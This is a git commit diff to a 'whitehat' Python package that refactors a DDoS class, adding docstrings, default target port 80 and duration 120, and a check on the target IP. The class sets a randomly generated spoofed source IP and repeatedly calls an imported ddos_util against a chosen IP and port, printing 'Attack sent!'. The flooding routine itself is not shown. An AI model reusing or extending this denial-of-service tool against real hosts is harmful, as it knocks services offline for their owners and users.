8e66bd305baf60cbf9eb7e812907a4f21525b6cf
LyQuid :3 <83483788+LyQuid12@users.noreply.github.com>
2022-01-03 11:18:12 +0700

    [DDoS] Update class name and added Docstrings

--- whitehat/ddos.py
+++ whitehat/ddos.py
@@ -1,18 +1,38 @@
 import random
 from .utilities.ddos_utils import ddos_util
+from .errors import *
 
-class ddos:
-    def __init__(self, IP: str, PORT: int, duration: int):
+class DDoS:
+    r"""A class that implements DDoS function
+    -----------
+    Parameters :
+    - IP: :class:`str` | Set target IP
+    - PORT: :class:`int` | Set target (Default : 80)
+    - duration: :class:`int` | Set DDoS duration (Default : 120) 
+    """
+
+    def __init__(self, IP: str, PORT:int=80, duration:int=120):
+        invalid_ip = ["https://", "http://"]
+
         ip1 = random.randint(100, 999)
         ip2 = random.randint(10, 999)
         ip3 = random.randint(10, 999)
         ip4 = random.randint(10, 999)
         self.fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
         self.duration = duration
+
+        if any(v in IP for v in invalid_ip):
+            raise InvalidIP
+
         self.IP = IP
         self.PORT = PORT
      
     def start(self):
+        r"""
+        Start DDoS
+        -----
+        """
+
         for i in range(self.duration):
             ddos_util(IP=self.IP, PORT=self.PORT, fake_ip=self.fake_ip)
             print("Attack sent!")
